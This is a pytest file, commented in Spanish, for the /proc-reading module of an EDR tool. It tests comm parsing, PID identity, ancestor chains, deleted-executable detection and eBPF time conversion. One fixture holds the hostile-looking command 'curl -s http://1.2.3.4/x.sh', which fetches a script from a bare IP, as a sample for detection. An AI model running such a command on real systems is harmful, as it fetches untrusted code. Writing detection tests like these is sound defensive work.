"""Tests de la lectura de /proc.

El grueso de estos tests ataca el parseo de `comm`, porque es donde un fallo pasa
inadvertido: un `starttime` mal leído no produce ningún error, solo una decisión
de seguridad equivocada más adelante.
"""

import os

import pytest

from edr import procinfo


# ── parseo de comm patológicos ─────────────────────────────────
# Los tres primeros no son hipotéticos: existen en la máquina de desarrollo
# (WSL2/Debian 13). Los dos últimos son los casos límite que rompen un parseo
# ingenuo basado en split() o en buscar el primer paréntesis.
@pytest.mark.parametrize("comm", [
    "(sd-pam)",          # el comm entero va entre paréntesis
    "Relay(203)",        # paréntesis en medio
    "init-systemd(De",   # paréntesis sin cerrar, truncado a 15 caracteres
    ") (",               # el caso patológico clásico
    "proceso con espacios",
])
def test_parseo_de_comm_patologico(fake_proc, comm):
    fake_proc(pid=42, comm=comm, ppid=7, starttime=98765)
    stat = procinfo.read_stat(42)

    assert stat is not None, f"no se pudo parsear comm={comm!r}"
    assert stat["comm"] == comm
    # Lo que de verdad importa: los campos posteriores no se han desplazado.
    assert stat["ppid"] == 7
    assert stat["starttime"] == 98765


def test_starttime_correcto_con_comm_que_contiene_parentesis(fake_proc):
    """Un split() ingenuo daría el campo equivocado sin lanzar ningún error."""
    fake_proc(pid=99, comm="a) (b", ppid=3, starttime=555555)
    assert procinfo.starttime(99) == 555555
    assert procinfo.proc_key(99) == "99:555555"


# ── proceso inexistente ────────────────────────────────────────

def test_proceso_inexistente_devuelve_none():
    pid = 999999
    assert procinfo.read_stat(pid) is None
    assert procinfo.starttime(pid) is None
    assert procinfo.comm(pid) is None
    assert procinfo.proc_key(pid) is None
    assert procinfo.snapshot(pid) is None
    assert procinfo.ancestors(pid) == []


def test_stat_truncado_devuelve_none(fake_proc, tmp_path):
    (tmp_path / "50").mkdir()
    (tmp_path / "50" / "stat").write_text("50 (corto) S 1 0 0\n")
    assert procinfo.read_stat(50) is None


def test_stat_sin_parentesis_devuelve_none(tmp_path, monkeypatch):
    monkeypatch.setattr(procinfo, "PROC", str(tmp_path))
    (tmp_path / "51").mkdir()
    (tmp_path / "51" / "stat").write_text("51 basura sin parentesis\n")
    assert procinfo.read_stat(51) is None


# ── proceso real ───────────────────────────────────────────────

def test_proceso_real(live_process):
    pid = live_process.pid
    stat = procinfo.read_stat(pid)

    assert stat is not None
    assert stat["comm"] == "sleep"
    assert stat["ppid"] == os.getpid()
    assert stat["starttime"] > 0
    assert not procinfo.is_kernel_thread(pid)


def test_starttime_es_estable(live_process):
    """La identidad no puede cambiar entre lecturas: es toda la premisa."""
    pid = live_process.pid
    assert procinfo.starttime(pid) == procinfo.starttime(pid)


def test_is_alive_compara_identidad(live_process):
    pid = live_process.pid
    st = procinfo.starttime(pid)

    assert procinfo.is_alive(pid, st)
    assert not procinfo.is_alive(pid, st + 1)
    # Sin identidad capturada no se puede afirmar nada: ante la duda, no se actúa.
    assert not procinfo.is_alive(pid, None)


def test_snapshot_de_proceso_real(live_process):
    snap = procinfo.snapshot(live_process.pid)

    assert snap["comm"] == "sleep"
    assert snap["exe"] is not None
    assert snap["exe_deleted"] is False
    assert "sleep" in snap["cmdline"]
    assert snap["uid"] == os.getuid()
    assert snap["proc_key"] == f"{live_process.pid}:{snap['starttime']}"


# ── hilos de kernel ────────────────────────────────────────────
# WSL2 no expone hilos de kernel en /proc, así que este caso solo se puede cubrir
# con un /proc sintético. En la VM del laboratorio (Fase 7) sí habrá kthreadd real.

def test_detecta_hilo_de_kernel(fake_proc):
    fake_proc(pid=2, comm="kthreadd", kthread=True)
    assert procinfo.is_kernel_thread(2)


def test_proceso_normal_no_es_hilo_de_kernel(fake_proc):
    fake_proc(pid=300, comm="bash", kthread=False)
    assert not procinfo.is_kernel_thread(300)


# ── cadena de ancestros ────────────────────────────────────────

def test_cadena_de_ancestros(fake_proc):
    fake_proc(pid=1, comm="systemd", ppid=0)
    fake_proc(pid=10, comm="sshd", ppid=1)
    fake_proc(pid=20, comm="bash", ppid=10)
    fake_proc(pid=30, comm="curl", ppid=20)

    assert procinfo.ancestors(30) == [20, 10, 1]


def test_ancestros_con_ciclo_no_cuelga(fake_proc):
    """/proc no debería tener ciclos, pero colgar el EDR sería peor que el bug."""
    fake_proc(pid=60, comm="a", ppid=61)
    fake_proc(pid=61, comm="b", ppid=60)

    chain = procinfo.ancestors(60)
    assert len(chain) < procinfo._MAX_ANCESTRY_DEPTH


def test_ancestros_de_proceso_real_terminan_en_1():
    chain = procinfo.ancestors(os.getpid())
    assert chain[-1] == 1
    assert os.getppid() == chain[0]


# ── ejecutable borrado ─────────────────────────────────────────

def test_detecta_ejecutable_borrado(fake_proc, tmp_path, monkeypatch):
    """Señal barata y muy frecuente en malware moderno."""
    fake_proc(pid=70, comm="evil", starttime=1)
    monkeypatch.setattr(
        procinfo.os, "readlink",
        lambda path: "/tmp/evil (deleted)" if path.endswith("/exe") else "/tmp",
    )
    snap = procinfo.snapshot(70)
    assert snap["exe_deleted"] is True


# ── cmdline ────────────────────────────────────────────────────

def test_cmdline_separa_por_nulos(fake_proc):
    fake_proc(pid=80, comm="curl", cmdline=["curl", "-s", "http://1.2.3.4/x.sh"])
    assert procinfo.cmdline(80) == "curl -s http://1.2.3.4/x.sh"


def test_cmdline_vacio_de_hilo_de_kernel(fake_proc):
    fake_proc(pid=81, comm="kworker", kthread=True, cmdline=[])
    assert procinfo.cmdline(81) == ""


# ── conversión de unidades entre la sonda y /proc ──────────────
# La sonda eBPF lee `task->start_boottime` en nanosegundos; /proc expone el mismo
# instante en ticks de reloj. Si la conversión no fuera exacta, la comprobación
# `pid_reused` fallaría siempre y no se podría remediar nada.

def test_ns_a_ticks():
    assert procinfo.ns_to_ticks(15_083_530_000_000) == 1_508_353
    assert procinfo.ns_to_ticks(0) == 0
    assert procinfo.ns_to_ticks(None) is None


def test_ns_a_ticks_trunca_como_el_kernel():
    """`nsec_to_clock_t` es una división entera: se trunca, no se redondea."""
    tick = procinfo.NS_PER_TICK
    assert procinfo.ns_to_ticks(tick - 1) == 0
    assert procinfo.ns_to_ticks(tick) == 1
    assert procinfo.ns_to_ticks(tick * 2 - 1) == 1


def test_la_conversion_coincide_con_proc(live_process):
    """La comprobación que de verdad importa, contra un proceso real.

    Se reconstruyen los nanosegundos a partir de los ticks que da /proc y se
    vuelve a convertir: el ciclo tiene que cerrar exacto.
    """
    ticks = procinfo.starttime(live_process.pid)
    assert procinfo.ns_to_ticks(ticks * procinfo.NS_PER_TICK) == ticks
